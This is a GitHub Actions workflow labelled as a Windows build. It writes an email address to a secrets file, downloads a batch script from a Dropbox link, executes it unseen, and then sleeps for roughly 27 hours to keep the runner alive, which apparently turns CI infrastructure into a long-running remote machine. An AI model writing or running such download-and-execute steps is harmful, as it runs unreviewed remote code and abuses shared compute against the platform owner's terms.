name: Windows

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Downloading & Setting Up
        run: |
         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/oiozminw3bxtmosmqmhl5/down.bat?rlkey=qzlg972u5j6nwz3ruw49cb4kw&dl=1" -OutFile "down.bat"
         cmd /c down.bat

      - name: Time Counter
        run: Start-sleep -Seconds 99999
